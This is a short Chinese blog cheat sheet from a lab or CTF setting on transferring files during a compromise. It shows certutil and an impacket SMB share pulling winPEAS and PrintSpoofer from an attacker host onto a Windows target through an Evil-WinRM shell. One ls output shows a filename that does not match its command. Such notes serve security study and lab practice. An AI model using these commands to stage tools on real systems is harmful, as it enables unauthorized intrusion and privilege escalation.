---
title: 传输文件
date: 2026-02-27T17:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
---
## Linux

以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .
```

## Windows

### 传入文件

### Certutil

```bash
*Evil-WinRM* PS C:\programdata\apps> certutil.exe -urlcache -split -f "http://10.10.16.155:8000/winPEASx64.exe" .
****  Online  ****
  000000  ...
  9b3200


CertUtil: -URLCache command completed successfully.
```

### Impacket-smbserver

在要共享的文件夹下创建共享目录。

```bash
┌──(kali㉿kali)-[~/Work]
└─$ ls -liah PrintSpoofer64.exe 
2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work]
└─$ sudo impacket-smbserver Enil . -smb2support
[sudo] password for kali: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

impacket-smbserver 必须添加参数 `-smb2support` 参数，即启用 SMB2 协议支持。

copy。

```bash
c:\ProgramData\apps>copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:00 AM    <DIR>          .
03/02/2026  03:00 AM    <DIR>          ..
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               2 Dir(s)   4,617,351,168 bytes free
```

### 传出文件

```bash
download
```